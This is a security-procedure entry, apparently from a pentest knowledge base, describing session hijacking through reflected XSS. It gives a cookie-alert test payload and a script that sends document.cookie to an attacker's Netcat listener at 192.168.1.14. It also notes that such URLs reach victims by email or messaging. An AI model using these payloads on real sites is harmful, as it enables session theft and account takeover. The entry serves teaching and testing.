---
id: 022eef4d-a6f3-4798-a58f-7106e4268374
name: Session Hijacking Through Reflected XSS
type: procedure
verified: true
submitted: true
created_at: '2020-07-23T14:34:05.969384+00:00'
updated_at: '2023-05-26T18:26:23.344129+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[Web Applications]]'
- '[[xss]]'
---

# Session Hijacking Through Reflected XSS

**Status**: ✓ Verified

## Summary

Description Session hijacking is possible through XSS vulnerabilities. An attacker will setup a listener and make the browser to initiate connection to the listener carrying session cookies along with the request. Instructions 1. Insert the javascript payload with document.cookie property through i

## Description

# Description 

Session hijacking is possible through XSS vulnerabilities. An attacker will setup a listener and make the browser to initiate connection to the listener carrying session cookies along with the request.

# 

# Instructions

# 

1. Insert the *javascript* payload with document.cookie property through input field

Payload: *<script>alert(document.cookie)</script>*

2. The inserted payload is executed popping up the SESSION_ID of the application.

3. A listener is setup in the attacker's machine (192.168.1.14) using Netcat on port 333 as shown below.

4. A payload that makes request to the attacker's listener is constructed and passed as input to the search field as shown below.

Payload: *<script type="text/javascript">document.location='http://192.168.1.14:333?cookie='+document.cookie;</script>*

5. The inserted script is executed by connecting to the attacker's listener, carrying SESSION ID as shown below.

Note: In real-time scenarios, the payload is sent to victim as URL through various techniques like Email, Instant Messaging etc.

## Platforms

- Web

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[Web Applications]]
- [[xss]]
